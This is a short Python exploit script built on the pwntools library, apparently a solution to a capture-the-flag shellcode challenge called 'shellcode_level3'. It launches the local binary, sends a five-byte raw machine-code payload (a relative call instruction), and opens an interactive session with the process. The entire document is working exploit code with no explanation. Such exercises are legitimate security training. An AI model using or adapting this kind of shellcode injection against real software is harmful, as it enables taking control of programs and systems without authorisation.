from pwn import *

io = process("./shellcode_level3")

payload = b"\xE8\x4D\xD1\xFF\xFF"

io.sendline(payload)
io.interactive()

